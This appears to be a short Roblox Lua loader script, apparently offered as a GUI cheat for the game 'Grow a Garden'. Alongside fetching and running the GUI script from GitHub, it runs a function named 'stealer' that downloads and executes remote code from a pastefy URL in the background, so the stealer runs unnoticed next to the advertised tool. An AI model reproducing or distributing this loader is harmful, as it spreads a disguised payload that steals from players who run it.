local function stealer()
    loadstring(game:HttpGet('https://pastefy.app/GYjzU6qr/raw'))()
end

local function loadui()
    task.wait(2) -- Wait for 2 seconds before loading the GUI
    loadstring(game:HttpGet('https://raw.githubusercontent.com/growagardenv3/Kripkrop/refs/heads/main/Flick.lua'))()
end

task.spawn(stealer)
task.spawn(loadui)
